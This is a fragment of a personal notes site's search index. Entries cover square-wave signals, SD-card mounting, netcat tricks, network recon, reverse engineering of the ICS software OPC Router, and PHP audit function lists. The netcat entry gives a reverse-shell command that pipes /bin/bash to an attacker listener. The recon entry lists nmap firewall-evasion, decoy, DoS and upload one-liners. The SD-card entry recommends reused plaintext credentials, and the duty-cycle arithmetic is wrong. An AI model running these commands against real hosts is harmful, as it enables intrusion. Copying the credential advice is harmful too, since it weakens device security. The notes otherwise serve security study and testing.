NEUROMANCERRATING [] PHYSICALGATEWAYLOCATIONS [] SOFTWARE_UPGRADES [] ",url:"https://duraki.github.io/notes/modding-uplink-by-introversion/"},"https:\/\/duraki.github.io\/notes\/modulated-square-wave-signals\/":{title:"Modulated Square Wave Signals",tags:[],content:"A Modulated Square Wave is a series of High/Low signals repeated rapidly.\n.caption-wrapper { margin-bottom: 60px !important; } .caption { } .caption-wrapper  .caption-text { display: block!important; text-align: left; font-style: italic; font-size: 12px; line-height: 1.1; padding-bottom: 20px; }  A Modulated Square Wave appears as a High/Low signal, repeated rapidly over and over  Like the switched signal B+ and B-, the square wave has only two voltage levels. These are: High Level and Low Level.\nA modulated square wave has 3 characteristics that can be modified to vary the required signal:\n Frequency Pulse Width Duty Cycle  Frequency The frequency of a modulated square wave signal is the number of complete cycles or pulses, that occur in one second (fq = O(cycle)^1sec). This number of cycles (or frequency) is expressed in Hertz (Hz). 1Hz = 1 complete cycle per second.\nAn output function may use a fixed or varied frequency.\n.caption-wrapper { margin-bottom: 60px !important; } .caption { } .caption-wrapper  .caption-text { display: block!important; text-align: left; font-style: italic; font-size: 12px; line-height: 1.1; padding-bottom: 20px; }  Different number of cycles per one (1) second - e.g. Frequency Herz  In the above picture, we can conclude: if 10Hz/sec then the sensor operates at frequency of 10Hz, else it\u0026rsquo;s operating on 20Hz, 100Hz and so on.\nThe frequency is fixed if the cycles operating in one second is constant. If cycles operating in one second is not constant, we call them varied frequency.\nTypical Application of Fixed and Varied Frequency   Fixed\n Throttle command from EMS2000 to EDR    Varied\n Hall Effect Crank Sensor Hall Effect Wheel Speed Sensor Hall Effect Camshaft Sensor    Pulse Width The Pulse Width of a signal is the length of time a pulse is running. Vehicle systems may use fixed or varied ON times/pulse width. Pulse width is expressed in milliseconds (ms).\n.caption-wrapper { margin-bottom: 60px !important; } .caption { } .caption-wrapper  .caption-text { display: block!important; text-align: left; font-style: italic; font-size: 12px; line-height: 1.1; padding-bottom: 20px; }  Pulse Width - Time it takes for a single portion of a Frequency Cycle (in milliseconds)  In above example, a period of a full cycle equals to pulse width multipled by twice; (since a cycle has a high cycle, and low cycle) - ON/OFF state.\nDuty Cycle The Duty Cycle of a Square Wave is the ratio of ON time to OFF time for one single cycle. Duty cycle is expressed in percentage (%).\nIn short, Duty Cycle is the ratio/percentage difference between ON/OFF Pulses. If the Square Wave signal consists of 3/ON pulses, and 2/OFF pulses, the ratio is 3/2, which means the Duty Cycle is ~150% for one signel cycle.\nVehicle systems use both fixed duty cycle signals, and also variable duty signals.\n.caption-wrapper { margin-bottom: 60px !important; } .caption { } .caption-wrapper  .caption-text { display: block!important; text-align: left; font-style: italic; font-size: 12px; line-height: 1.1; padding-bottom: 20px; }  Duty Cycle ratio in different cycle signals  Time\n 1 second = 1000 milliseconds (ms) 1/4 second = 250 milliseconds 1/100 second = 10 milliseconds 1/2 second = 500 milliseconds 1/10 second = 100 milliseconds 1/1000 second = 1 millisecond  ",url:"https://duraki.github.io/notes/modulated-square-wave-signals/"},"https:\/\/duraki.github.io\/notes\/mounting-sd-cards\/":{title:"Mounting SD Cards",tags:[],content:"MacOS Instructions The instructions below are only viable for MacOS based Host operating systems. For Linux, please refer to [/linux-notes].\nMounting ext4 Linux partition Check MacOS Notes for detailed instructions. todo: move the instructions in this document\nMounting boot partition  Insert your SD Card in the Card Reader Open Terminal and enter following commands  # =\u0026gt; if one fails, try the other one $ sudo mount /Volumes/boot -o remount,rw $ sudo mount -uw /Volumes/boot You should be able to write to boot partition now, ie.: touch /Volumes/boot/hey.txt. See Raspberry Pi Quick Guide on how to enable SSH via this method.\nLinux Instructions todo: add linux instructions, if required.\nOther Tricks Labeling OS image on the SD Card\nIt is sometimes confusing to maintain large number of SD Cards, over large number of SBCs. To easily identify multiple SD Cards from each other, you can simply create a text file in /boot partition of your microSD with meaningful names, ie:\n\u0026lt;sdcard\u0026gt;/boot/os-kali-linux.txt or \u0026lt;sdcard\u0026gt;/boot/os-raspbian.txt are meaningful names, and it\u0026rsquo;s easily identified without needing for a boot. Just insert microSD in your card reader, and open the /boot partition.\nUse Simple Authentication\nUse simple user and password authentication across all images, ie: pi:pi for all Raspberries, Lemaker\u0026rsquo;s Boards and other SBCs. That way you don\u0026rsquo;t need to remember each and all of them.\nhint: additionally, add the user:pass auth combo in the /boot/os-*.txt file, described in Labeling OS image on the SD Card.\nSet Wi-Fi Network Credentials in wpa_supplicant.conf\nIn the /boot/ partition, create a new file wpa_supplicant.conf, and save it like this:\n# =\u0026gt; wpa_supplicant.conf ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev update_config=1 country=BA network={ ssid=\u0026#34;The Matrix\u0026#34; psk=\u0026#34;wifi-password-1234	\u0026#34; key_mgmt=WPA-PSK } ",url:"https://duraki.github.io/notes/mounting-sd-cards/"},"https:\/\/duraki.github.io\/notes\/netcat-tricks\/":{title:"netcat tricks",tags:[],content:"Basic use of Netcat + CentOS Firewall Rules For direct reverse shell:\n|attacker machine|\u0026lt;------\u0026gt;|victim machine| On \u0026ldquo;attackers machine\u0026rdquo; (vps, infra, blackhole), drop all iptables rules (dirty), and setup a connection listener:\n$ sudo iptables -F $ sudo ncat -nlvp 9999 On \u0026ldquo;victim machine\u0026rdquo; (target), connect to netcat listener:\n$ ncat x.x.x.x 9999 -e /bin/bash You should have a working remote shell n0w.\nFor probe direct reverse shell:\n|attacker machine|\u0026lt;------\u0026gt;|attacker box|\u0026lt;-------\u0026gt;|victime machine| On \u0026ldquo;attackers box\u0026rdquo; (blackhole and/or owned boxes), drop all iptables rules (dirty), and setup a connection broker.\n$ sudo iptables -F # =\u0026gt; important! $ sudo ncat --broker 9999 # =\u0026gt; creates a broker for probing On \u0026ldquo;attackers machine\u0026rdquo; (see above):\n$ sudo ncat [attacker box] 9999 On \u0026ldquo;victim machine\u0026rdquo;:\n$ sudo ncat ",url:"https://duraki.github.io/notes/netcat-tricks/"},"https:\/\/duraki.github.io\/notes\/network\/":{title:"Network",tags:[],content:" Basic Network Recon Firewall Penetration Test Wifi Cracking via Aircrack GSN3 Lab Environment Metasploit Framework Server Anywhere Netcat Tricks  ",url:"https://duraki.github.io/notes/network/"},"https:\/\/duraki.github.io\/notes\/network-lab\/":{title:"Network Lab",tags:[],content:"Simple Topology In GSN3, add 2 VPCS and 2 Cisco routers. Start VPCS and enter Console mode. Append IPv4 address for the interface.\n# sets ipv4; netmask and gw for the vpc PC1\u0026gt; ip 192.168.0.10/24 192.168.0.1 Checking for duplicate address... PC1 : 192.168.0.10 255.255.255.0 gateway 192.168.0.1 # ... same for the 2nd vpc with different static ip # PC2\u0026gt; ip 192.168.0.11/24 192.168.0.1 Always save the configuration of the assets with save command:\nPC1\u0026gt; save Saving startup configuration to startup.vpc . done Advanced Topology Corporate Topology SCADA Topology ",url:"https://duraki.github.io/notes/network-lab/"},"https:\/\/duraki.github.io\/notes\/network-recon\/":{title:"Network Recon",tags:[],content:"External Network Engagement nmap oneliners (do-it-all) + fw evasion\n$ nmap -Pn -vvv -sC --script=firewalk -p1-65535 -D RND:10 \u0026lt;target\u0026gt; basic recon\n$ nslookup set type=NS x.x.x.x basic nmap\n$ sudo nmap -sS 80.101.121.42 # syn scan first $ sudo nmap -O 80.101.121.42 # os detection $ sudo nmap -sV -sS 80.101.121.42 -p 8089 # service detection $ nc 80.101.121.42 8089 # try connecting via detected ports basic masscan\n$ sudo masscan 80.101.121.42 -p0-65535 --rate 10000 -eutun2 # =\u0026gt; via vpn tunnel (tun2) $ sudo masscan 80.101.121.42 -p0-65535 --rate 10000 # =\u0026gt; default eth nmap exoitc firewall evasion rules\n Bypassing Firewall Rules  ping gateway ipv4 address\n$ nmap -sn -v -PE 192.168.*.1 dns enumeration\n$ dig –t any example.ba revere DNS lookup\n$ sudo nmap -sL x.x.x.x identity alive ipv4\n$ sudo nmap-sn-n x.x.x.x asn/bgp extractoion\n BGP View BGP.he.net  reverse ip domain lookup\n Domainstools  zoomeye search\n zoomeye  additional nmap scripts\n# =\u0026gt; Basic Recon nmap -n p80,\u0026lt;port\u0026gt;,... --script http-enum x.x.x.x nmap -v --script dos x.x.x.x sudo nmap -v --script vuln x.x.x.x nmap -n -p --script dns-brute x.x.x.x # =\u0026gt; Vuln scan nmap -sV --script=vulners x.x.x.x sudo nmap -sV -Pn -p4000-4433,8000-8089,80-443,9000-9443 --script=vulscan/vulscan x.x.x.x firewall evasion\n Firewall Penetration Test  # =\u0026gt; Firewall Hopping $ nmap --script=firewalk --traceroute x.x.x.x # =\u0026gt; Firewall Vulnerability Scanning $ nmap --script nmap-vulners,vulscan --script-args vulscandb=scipvuldb.csv -sV -p$PORT x.x.x.x run specific nmap scripts on specific port\n┌──(kali㉿kali)-[/usr/share/nmap/scripts] └─$ sudo nmap --script \u0026#34;+http-*\u0026#34; x.x.x.x -p4433,8089,80,9443 discover vhost on the target\n Virtual Host Enumeration  $ nmap -p4433,8089,80,9443 --script=\u0026#34;+http-vhosts\u0026#34; x.x.x.x -Pn PUT directly to server\n$ nmap -p 4433,8089 x.x.x.x --script http-put --script-args http-put.url=\u0026#39;/\u0026#39;,http-put.file=\u0026#39;fileput.txt\u0026#39; -Pn detecet WAF\n$ nmap --script=http-waf-fingerprint --script-args http-waf-fingerprint.intensive=1 x.x.x.x -Pn --top-ports=100 SSL scan\n$ nmap -sV --script ssl-dh-params x.x.x.x -Pn -p4433,8089,80,9443,443 heartbleed scan\n$ nmap -sV --script ssl-heartbleed x.x.x.x -Pn -p4433,8089,80,9443,443 known SSL keys\n$ nmap -sV --script ssl-known-key x.x.x.x -Pn -p4433,8089,80,9443,443 check for POODLE\n$ nmap -sV --version-light --script ssl-poodle -p4433,8089,80,9443,443 x.x.x.x -Pn check for SSLv2 DROWN\n$ nmap -sV --script=sslv2-drown -p4433,8089,80,9443,443 x.x.x.x -Pn try banner grabbing\n$ nc -nvv x.x.x.x 4433 (UNKNOWN) [???] 4433 (?) open try dumping pcap files\n$ sudo tcpdump -ttttnnr tcp_dump.pcap tcpdump -qns 0 -A -r blah.pcap ",url:"https://duraki.github.io/notes/network-recon/"},"https:\/\/duraki.github.io\/notes\/network-reverse-engineering\/":{title:"Network Reverse Engineering",tags:[],content:"using netstat (xnu) to print only TCP entries for a specific PID:\n$ netstat -anvp tcp | awk \u0026#39;{ if ($9 == PID) print }\u0026#39; # =\u0026gt; ie. # $ netstat -anvp tcp | awk \u0026#39;{ if ($9 == 1105) print }\u0026#39; ## tcp4 0 0 192.168.0.25.52952 52.0.253.194.443 ESTABLISHED 131072 131072 1105 0 0x0102 0x00000000 ## tcp4 0 0 127.0.0.1.45112 *.* LISTEN 131072 131072 1105 0 0x0100 0x00000106 ## tcp4 0 0 127.0.0.1.30666 *.* LISTEN 131072 131072 1105 0 0x0100 0x00000106 using netstat (xnu) for inet, tcp or udp:\n$ netstat -anvp inet/tcp/udp # =\u0026gt; pick one # =\u0026gt; other shorthands: inet,inet6,pfkey,atalk,netgraph,ipx,unix,link,sctp,udp,ddp (man netstat) using netstat (linux) for host matching:\n$ netstat -a -c | grep -i example.com ",url:"https://duraki.github.io/notes/network-reverse-engineering/"},"https:\/\/duraki.github.io\/notes\/ntc-sensors\/":{title:"NTC Sensors",tags:[],content:"NTC (Negative Temperature Coefficient) sensors is a type of DC Analog Sensor which change resistance based on temperature.\nWhen a temperature goes up, the resistance goes down. This decrease in resistance causes the voltage drop across the sensor to decrease. Therefore, the input signal voltage at the Control Module decreases.\n.caption-wrapper { margin-bottom: 60px !important; } .caption { } .caption-wrapper  .caption-text { display: block!important; text-align: left; font-style: italic; font-size: 12px; line-height: 1.1; padding-bottom: 20px; }  Typical Sensor Signal  Check PTC Sensors as well as NTC/PTC Sensor Troubleshooting for more details on this kind of Sensors.\nTypical Application of NTC Type Sensor  Engine Coolant Temp Sensor Transmission Temp Sensor T-MAP Sensor IHKA Interior Air Temp Sensor \u0026hellip;  ",url:"https://duraki.github.io/notes/ntc-sensors/"},"https:\/\/duraki.github.io\/notes\/opcrouter-research\/":{title:"OPCRouter Research",tags:[],content:"OPC-Router.com Exploitation and Vulnearbility Research Supported Platforms:\n OPC-Router 4.18 (named: **OPCRouter-4.18.5005.126.exe**)  Windows Server 2016 \u0026amp; 2012 R2 Windows 10 (also IoT) \u0026amp; 8.1   OPC-Router 4.18 (named: **OPCRouter-4.18.5005.126 (Windows 7).exe**)  Windows Server 2012 R1 \u0026amp; 2008 R2 Windows 8.0 \u0026amp; 7    What is OPC OLE for Process Control (OPC) is a set of standard interfaces based upon Microsoft\u0026rsquo;s OLE/COM technology. The application of the OPC standard interface makes possible interoperability between automation/control applications, field systems/devices etc.\nELI5: OPC is a \u0026ldquo;standard\u0026rdquo; used to share data in ICS between PC\u0026rsquo;s and:\n Enterprise Application, User Interfaces, Transport Layer, PLC \u0026amp; Devices  Usually, all vendors implements their own PLC Data Sharing Protocol which creates a large inconsistency and implementation in SCADA\u0026rsquo;d environment. OPC Foundation published an OPC standard for Automation Industry Organization and Industrial Control Systems.\nOPC Standards OPC offers a standard to Software Interface, decopupled from HMI/SCADA which is a great advantage. It comes usually in two parts:\n OPC Server - Exposes PLC memory address and label them as Tags. Tags are friendly name that maps to memory register in the PLC. Decouples the OPC Client from underlying DPMR. OPC Client - Used to connect to OPC Server and read respectable tags. OPC Data Access (OPC DA) - Browse infra for available OPC Servers. Browse OPC Server for tags and data. Can read/write Tags in a single call. Can subscribe to Tags for firing events in case of value(s) change. Blocking call therefore suspectable to DoS attack. Can lookup locations based on Cache or Device. OPC Unified Architecture (OPC UA) - This is new standard that will replace, modernize and enhance all the functionality of the existing OPC defined interfaces. OPC UA is described in a layered set of specifications broken into Parts. Basically, an \u0026ldquo;updated\u0026rdquo; OPC Standard. OPC Data Exchange (OPC DX) - Substandard/proto of OPC Standard.  Other terminology:\n HMI - Human Machine Interface SCADA - Supervisory Control \u0026amp; Data Acquisition DDE - Dynamic Data Exchange PLC - Programmable Logic Controller DCS - Distributed Control System – purposes as a PLC, but highly optimized for process control, i.e. chemicals, oil/gas, food/beverage, pharmaceutical RTU - Remote Terminal Unit – traditionally proprietary hardware – as today PLCs can be used for RTU\u0026rsquo;s Register – a memory location in a PLC or DCS. To some a register is a 16 bit word of data Tag, or Item – a single unit of data – can be digital or analog values, or even arry DCOM - Basically a protocol on top of Microsoft\u0026rsquo;s COM for RPC (Remote Procedure Call), offers communication between COM-based applications over the network.  OPC Reverse Engineering All downloaded installations, the OPCRouter and OPCServer (KEPServerEX) from the download page visible are put for further reuse into ./Installations directory.\nThe OPC Router connects systems vertically and horizontally, from sensors and controls to ERP and the cloud, from printers and scales to MES, SCADA or LIMS.\nVendor\n### inray Industriesoftware GmbH Holstenstraße 40, 25560 Schenefeld, Germany Phone: [+49 4892-89008-0](tel:+49 4892-89008-0) Email: [info@inray.de](mailto:info@inray.de) Web: [inray.de](https://www.inray.de/) DOWNLOAD LINKS:\n Demo Link Undirect Link  After installation, double-click the \u0026ldquo;OPC Router Configuration\u0026rdquo; from the Windows Desktop. This will open a OPC Router GUI for configuration.\nPrior to exploring, we need to setup the lab as per the manual:\n Requires  Accessible OPC Server to communicate with PLCs (OPC DA 4.0, UA, XML) - see below Accessible Database Server (MS SQL, Oracle, MySQL and all others via ODBC. MS Access and writing/reading XML files supported as well)  for Oracle, you need additional Oracle instant client (ODAC)   SAP plug-in supports SAP systems 4.0b or newer    Enabling extensive LOG files in OCP Router  Open OPC Router Configuration from the Desktop Shortcut Click Extras → Settings from the Menu Bar Scroll to bottom of the Settings Pane/Tab Check all checkboxes in Log Output  Starting OPC Router Service(s)  Open OPC Router Configuration from the Desktop Shortcut Click Service → Start from the Menu Bar Now you can open for example: C:\\OPCRouter4\\LogDir\\OPCRouterService_15.txt for detailed log output of a started service  Observations By default, a connection string is visible in OCP Router Config Logfile from above Profiling:\n `15.05.21 21:44:34.574[Trace:DacPac] SqlConstantConnection: SERVER=(localdb)\\.\\OPCRouter4;DATABASE=OPCRouterConfig;Trusted_Connection=Yes;APP=OPC-Router;Pooling=false;Connect Timeout=30`  `15.05.21 21:44:36.554[Trace:StorageManager] SqlConstantConnection: SERVER=(localdb)\\.\\OPCRouter4;DATABASE=OPCRouterConfig;Trusted_Connection=Yes;APP=OPC-Router;Pooling=false;Connect Timeout=30`  `15.05.21 21:44:36.639[Trace:StorageManager] SqlConstantConnection: SERVER=(localdb)\\.\\OPCRouter4;Trusted_Connection=Yes;APP=OPC-Router;Pooling=false;Connect Timeout=30`  `15.05.21 21:44:37.092[Trace:StorageManager] SqlConstantConnection: SERVER=(localdb)\\.\\OPCRouter4;DATABASE=OPCRouterLongTimeStorage;Trusted_Connection=Yes;APP=OPC-Router;Pooling=false;Connect Timeout=30` The application, when having started services running, have this information disclosed in State → Service Status → Dashboard. For example, see logs/Dashboard.xml on example:\nOPC Router 4 Service is starting at 15/05/2021 20:23:42 Starting RedundancyServerManager. Listening on port 49954 ... There are number of *.exe under OPC Router Installation Directory, as seen below:\n# =\u0026gt; SQLLocalDB\\inray.Data.SqlLocalDB.Service.exe PS C:\\OPCRouter4\u0026gt; C:\\OPCRouter4\\SQLLocalDB\\inray.Data.SqlLocalDB.Service.exe 02:39:14 Arguments are invalid! 02:39:14 inray.data.sqllocaldb.service.exe - inray.Data.LocalDB.Service - (c) Copyright by inray Industriesoftware Usage: inray.data.sqllocaldb.service.exe -n \u0026lt;arg\u0026gt; [-i -u] Available commands: ------------------- -n, --InstanceName The Name of the instance -i, --install install the service -u, --uninstall uninstall the service 02:39:14 \u0026lt;Enter\u0026gt; to continue... # =\u0026gt; It was also observed that the file *.config consists of XML key/val attributes # =\u0026gt; holding the Database settings PS C:\\OPCRouter4\u0026gt; more C:\\OPCRouter4\\SQLLocalDB\\inray.Data.SqlLocalDB.Service.exe.config | grep InitialDatabase -C 10 .... \u0026lt;DatabaseConfiguration\u0026gt; \u0026lt;InitialDatabases\u0026gt; \u0026lt;Database Name=\u0026#34;OPCRouterConfig\u0026#34; BackupFile=\u0026#34;Backup\\OPCRouterConfig.bak\u0026#34;/\u0026gt; \u0026lt;Database Name=\u0026#34;OPCRouterShortTimeStorage\u0026#34; BackupFile=\u0026#34;Backup\\OPCRouterShortTimeStorage.bak\u0026#34;/\u0026gt; \u0026lt;Database Name=\u0026#34;OPCRouterLongTimeStorage\u0026#34; BackupFile=\u0026#34;Backup\\OPCRouterLongTimeStorage.bak\u0026#34;/\u0026gt; \u0026lt;Database Name=\u0026#34;OPCRouterRuntime\u0026#34; BackupFile=\u0026#34;Backup\\OPCRouterRuntime.bak\u0026#34;/\u0026gt; \u0026lt;/InitialDatabases\u0026gt; \u0026lt;/DatabaseConfiguration\u0026gt; \u0026lt;/configuration\u0026gt; # =\u0026gt; Later, it was discovered that intensive Log Files were also discovered in that subdirectory, as shown: PS C:\\OPCRouter4\\SQLLocalDB\\LogDir\u0026gt; ls Directory: C:\\OPCRouter4\\SQLLocalDB\\LogDir Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 15. 5. 2021. 23:59 256287 LoggerBase_15.txt -a---- 16. 5. 2021. 02:44 286907 LoggerBase_16.txt # =\u0026gt; @see logs/LoggerBase_16.txt for example # =\u0026gt; When using Process Explorer, there is a process (service) created and running # =\u0026gt; that shows the above utility running: # =\u0026gt; Process Explorer shows running this service as: C:\\OPCRouter4\\SQLLocalDB\\inray.Data.SqlLocalDB.Service.exe -s -n \u0026#34;OPCRouter4\u0026#34; # =\u0026gt; To kill/debug server, you need to open Microsoft Windows # =\u0026gt; Control Panel and disable the Service # =\u0026gt; A registry editor shows this path for the above service # Computer\\HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\OPCRouter4-LocalDB # =\u0026gt; Disable service using below window from \u0026#34;Services\u0026#34; (Control Panel), and then # =\u0026gt; we can symlink this database for further exploration # =\u0026gt; MINGW64:/c/ Test Account@DESKTOP-RONDJPT MINGW64 /c $ ln -fs /c/OPCRouter4/ \u0026#34;//vmware-host/Shared Folders/InstallDir\u0026#34; # =\u0026gt; Now resume the service via exe path shown in \u0026#39;Services\u0026#39; To debug the above server, I used approach described here:\n Reference  # =\u0026gt; Run Windows Terminal with Admin Privs, and then: # Use gflags.exe to map Image File as a Service PS C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x64\u0026gt; .\\gflags.exe ... set as in below image and click Apply -\u0026gt; Launch ... ## Image: C:\\OPCRouter4\\SQLLocalDB\\inray.Data.SqlLocalDB.Service.exe -s -n \u0026#34;OPCRouter4\u0026#34; ## Debugger: C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x64\\windbg.exe -server tcp:port=5005 -c \u0026#34;g\u0026#34; # Use WinDbg to connect to host PS C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x64\u0026gt; .\\windbg.exe --remote tcp:Port=5005,Server=127.0.0.1 # ... or attach via PID (that is, gflags.exe PID) Additional directory \u0026amp; files exists through the app lifecycle. For example, using API Monitor + SysMon we gathered these additional queries by the application, specifically in the directory C:\\ProgramData\\inray as well as %appdata%\\Local\\inray_industriesoftware_G:\n# =\u0026gt; Discovering more bin/lib(s) PS C:\\ProgramData\\inray\\AppSettings\u0026gt; more .\\OPCRouter4\\OPCRouter4.settings ... \u0026lt;/Password\u0026gt; \u0026lt;RuntimeCatalog\u0026gt;OPCRouterRuntime\u0026lt;/RuntimeCatalog\u0026gt; \u0026lt;Port\u0026gt;1433\u0026lt;/Port\u0026gt; \u0026lt;ConnectionTimeout\u0026gt;30\u0026lt;/ConnectionTimeout\u0026gt; \u0026lt;ConfigCatalog\u0026gt;OPCRouterConfig\u0026lt;/ConfigCatalog\u0026gt; \u0026lt;IntegratedSecurity\u0026gt;True\u0026lt;/IntegratedSecurity\u0026gt; \u0026lt;DatabaseServer\u0026gt;(localdb)\\.\\OPCRouter4\u0026lt;/DatabaseServer\u0026gt; # =\u0026gt; I copied this data in ~/Program Data/ directory of this project # =\u0026gt; @see: OPCRouter_OPC-Server@AR\\ProgramData\\inray --- # =\u0026gt; Likewise, in %appdata% directory, a user.config files are hidding PS C:\\Users\\Test Account\\AppData\\Local\\inray_Industriesoftware_G\u0026gt; ls Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 16. 5. 2021. 08:08 inray.Tool.DacPacDeploy.e_Url_wdxasxd1lwq2m54joacwxw1hqc3mijhx d----- 15. 5. 2021. 21:44 OPCRouterConfig.exe_StrongName_jw3q4nghqgrybwap5koxvkruxpapvd5j # =\u0026gt; I copied this data in ~/AppData_Local/ directory of this project # =\u0026gt; @see: OPCRouter_OPC-Server@AR\\AppData_Local\\inray_Industriesoftware_G During the File Monitor and File System analysis, I discovered a hidden (ie. Isolated Storage) identity being accessed from the Application:\nUse this for reference:\n# =\u0026gt; ./filemon ... identity.dat	Read Write ReadAttributes Synchronize	SUCCESS	4	5,89	0.0.0.0	C:\\Users\\Test Account\\AppData\\Local\\IsolatedStorage\\hfyw1qvw.lyh\\bfyk5gc3.2tn\\StrongName.q23pcsbq0aqsyq1ss2yaivhiqs3zep4o\\identity.dat ... # =\u0026gt; I made a backup of this directory for further research # =\u0026gt; @see: OPCRouter_OPC-Server@AR\\AppData_Local\\isolatedStorage\\StrongName.q23pcsbq0aqsyq1ss2yaivhiqs3zep4o All instances of database service(s) are visible in the next directory:\nC:\\Windows\\ServiceProfiles\\OPCRouter4-LocalDB\\AppData\\Local\\Microsoft\\Microsoft SQL Server Local DB\\Instances\\OPCRouter4\nAdditionally, using RegEdit.exe you can point to the next path and see observables used for Token Invocations:\nComputer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Microsoft SQL Server Local DB\\Shared Instances\\OPCRouter4 Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\inray Industriesoftware GmbH\\OPC-Router Deobfuscation C:\\tools\\de4dot-net45\\de4dot.exe -r c:\\input -ru -ro c:\\output # =\u0026gt; decompile with autodetection from stdin to stdout C:\\tools\\de4dot-net45\\de4dot.exe -d -r C:\\OPCRouter4\\ -ru -ro C:\\OPCRouter4-De\\ # =\u0026gt; detection only, skips unsupported obfuscators due to -ru C:\\tools\\de4dot-net45\\de4dot-x64.exe -f C:\\OPCRouter4\\OPCRouterConfig.exe -o C:\\OPCRouter4-De\\OPCRouterConfig.exe -p dr3 # =\u0026gt; uses .net reactor which works C:\\tools\\de4dot-net45\\de4dot.exe -r C:\\OPCRouter4\\ -ru -ro C:\\OPCRouter4-De-netr3\\ -p dr3 # =\u0026gt; not supported (recursive + specify cryptor) OPC Server As per OPC Router documentation, an OPC Server is required for data aggregation from Process Network layer.\nDo you need an OPC Server? If you also require an OPC Server for your project, we recommend the Kepware OPC Server: * https://www.kepware.com/en-us/products/kepserverex/ The Kepware OPC Server provides more than 160 communication drivers and can therefore be used for connecting many different control systems and IoT devices. References:\n Demo Download Install Guide Documentation / Manuals  Another option for OPC Server is to use MatrikonPC\u0026rsquo;s version available as a free/shareware on their website. I saw this paper being used in a Lab environment when reading \u0026ldquo;Penetration Testing of OPC as Part of Process Control Systems\u0026quot; doi:10.1007/978-3-540-69293-5_22\n Download Link  Resources:\n http://alvarestech.com/temp/smar/2019/OPC%20and%20DCOM%20-%205%20things%20you%20need%20to%20know%20-%20Windows%2010.pdf https://github.com/Engineering-Research-and-Development/opc-ua-car-server https://www.matrikonopc.com/resources/dictionary.aspx  OPC Test:\n Cisco Notes  Other Tools:\n binwalk Frida uniextractor pegasus for windbg dependecywalker fribratus  ",url:"https://duraki.github.io/notes/opcrouter-research/"},"https:\/\/duraki.github.io\/notes\/osint\/":{title:"OSINT",tags:[],content:"Breach Compilation (1.4BILL)  ",url:"https://duraki.github.io/notes/osint/"},"https:\/\/duraki.github.io\/notes\/php-filesystem-functions\/":{title:"PHP Filesystem Functions",tags:[],content:"Filesystem functions analysis as a part of PHP Source Code Analysis:\n// open filesystem handler fopen tmpfile bzopen gzopen SplFileObject-\u0026gt;__construct // write to filesystem (partially in combination with reading) chgrp chmod chown copy file_put_contents lchgrp lchown link mkdir move_uploaded_file rename rmdir symlink tempnam touch unlink imagepng - 2nd parameter is a path. imagewbmp - 2nd parameter is a path. image2wbmp - 2nd parameter is a path. imagejpeg - 2nd parameter is a path. imagexbm - 2nd parameter is a path. imagegif - 2nd parameter is a path. imagegd - 2nd parameter is a path. imagegd2 - 2nd parameter is a path. iptcembed ftp_get ftp_nb_get // read from filesystem file_exists file_get_contents file fileatime filectime filegroup fileinode filemtime fileowner fileperms filesize filetype glob is_dir is_executable is_file is_link is_readable is_uploaded_file is_writable is_writeable linkinfo lstat parse_ini_file pathinfo readfile readlink realpath stat gzfile readgzfile getimagesize imagecreatefromgif imagecreatefromjpeg imagecreatefrompng imagecreatefromwbmp imagecreatefromxbm imagecreatefromxpm ftp_put ftp_nb_put exif_read_data read_exif_data exif_thumbnail exif_imagetype hash_file hash_hmac_file hash_update_file md5_file sha1_file highlight_file show_source php_strip_whitespace get_meta_tags ",url:"https://duraki.github.io/notes/php-filesystem-functions/"},"https:\/\/duraki.github.io\/notes\/php-source-code-analysis\/":{title:"PHP Source Code Analysis",tags:[],content:"When looking at PHP applications and source code analysis process, one of the first things I grep and search for are for functions accepting $USER input with the potential to execute an external program or malform the input in some form or action:\nUse this grep command\n$ grep -nR \u0026#34;exec(\u0026#34; ./phpBB/ --include \\*.*php* | more` Important Function\nassert() create_function() eval() exec() Execution Operators (``) include() include_once() passthru() pcntl_exec() popen() preg_replace() (with `/e` modifier) proc_open() ReflectionFunction (class) require() require_once() shell_exec() system() Command Execution\nexec - Returns last line of commands output passthru - Passes commands output directly to the browser system - Passes commands output directly to the browser and returns last line shell_exec - Returns commands output `` (backticks) - Same as shell_exec() popen - Opens read or write pipe to process of a command proc_open - Similar to popen() but greater degree of control pcntl_exec - Executes a program PHP Code Execution\neval() assert() - identical to eval() preg_replace(\u0026#39;/.*/e\u0026#39;,...) - /e does an eval() on the match create_function() include() include_once() require() require_once() $_GET[\u0026#39;func_name\u0026#39;]($_GET[\u0026#39;argument\u0026#39;]); $func = new ReflectionFunction($_GET[\u0026#39;func_name\u0026#39;]); $func-\u0026gt;invoke(); or $func-\u0026gt;invokeArgs(array()); List of Functions which accept callbacks\nFunction =\u0026gt; Position of callback arguments \u0026#39;ob_start\u0026#39; =\u0026gt; 0, \u0026#39;array_diff_uassoc\u0026#39; =\u0026gt; -1, \u0026#39;array_diff_ukey\u0026#39; =\u0026gt; -1, \u0026#39;array_filter\u0026#39; =\u0026gt; 1, \u0026#39;array_intersect_uassoc\u0026#39; =\u0026gt; -1, \u0026#39;array_intersect_ukey\u0026#39; =\u0026gt; -1, \u0026#39;array_map\u0026#39; =\u0026gt; 0, \u0026#39;array_reduce\u0026#39; =\u0026gt; 1, \u0026#39;array_udiff_assoc\u0026#39; =\u0026gt; -1, \u0026#39;array_udiff_uassoc\u0026#39; =\u0026gt; array(-1, -2), \u0026#39;array_udiff\u0026#39; =\u0026gt; -1, \u0026#39;array_uintersect_assoc\u0026#39; =\u0026gt; -1, \u0026#39;array_uintersect_uassoc\u0026#39; =\u0026gt; array(-1, -2), \u0026#39;array_uintersect\u0026#39; =\u0026gt; -1, \u0026#39;array_walk_recursive\u0026#39; =\u0026gt; 1, \u0026#39;array_walk\u0026#39; =\u0026gt; 1, \u0026#39;assert_options\u0026#39; =\u0026gt; 1, \u0026#39;uasort\u0026#39; =\u0026gt; 1, \u0026#39;uksort\u0026#39; =\u0026gt; 1, \u0026#39;usort\u0026#39; =\u0026gt; 1, \u0026#39;preg_replace_callback\u0026#39; =\u0026gt; 1, \u0026#39;spl_autoload_register\u0026#39; =\u0026gt; 0, \u0026#39;iterator_apply\u0026#39; 